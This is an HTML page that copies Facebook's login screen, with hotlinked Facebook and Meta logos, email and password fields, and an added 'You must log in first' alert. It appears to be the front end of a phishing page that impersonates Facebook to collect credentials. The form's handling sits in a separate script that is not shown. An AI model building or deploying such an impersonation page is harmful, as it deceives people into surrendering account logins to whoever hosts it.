<!-- @format -->

<!DOCTYPE html>
<html>
	<head>
		<title>Log in to Facebook</title>
		<link rel="stylesheet" href="index.css" />
		<link
			rel="icon"
			type="image/svg+xml"
			href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	</head>
	<body>
		<div class="fb-logo-text">facebook</div>
		<div class="fb-logo-icon">
			<img
				src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png"
				alt="Facebook" />
		</div>
		<!-- Add the alert message here -->
		<div class="login-alert">You must log in first</div>
		<div class="container">
			<h2 class="login-heading">Log in to Facebook</h2>
			<form>
				<input type="email" placeholder="Email address or phone number" />
				<input type="password" placeholder="Password" />
				<button type="submit" class="login-btn">Log in</button>
			</form>
			<a href="#" class="forgot-link">Forgotten account?</a>
			<div class="divider">or</div>
			<button class="create-account-btn">Create new account</button>
		</div>
		<div class="meta-footer">
			<img
				src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yg/r/6EMh2DWYp9P.png"
				alt="Meta"
				class="meta-logo" />
			<div class="meta-links">
				<a href="#">About</a> <a href="#">Help</a> <a href="#">More</a>
			</div>
		</div>
		<script src="/index.js"></script>
	</body>
</html>
